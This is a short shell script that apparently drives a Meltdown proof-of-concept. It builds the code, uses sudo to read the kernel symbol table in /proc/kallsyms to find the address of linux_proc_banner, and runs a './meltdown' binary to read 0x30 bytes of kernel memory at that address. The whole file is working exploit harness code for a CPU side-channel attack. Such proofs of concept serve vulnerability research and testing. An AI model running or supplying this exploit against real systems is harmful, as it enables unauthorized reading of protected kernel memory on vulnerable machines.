#!/bin/sh
make
linux_proc_banner=$(sudo cat /proc/kallsyms | grep linux_proc_banner | sed -n -re 's/^([0-9a-f]*[1-9a-f][0-9a-f]*) .* linux_proc_banner$/\1/p')
./meltdown $linux_proc_banner 0x30
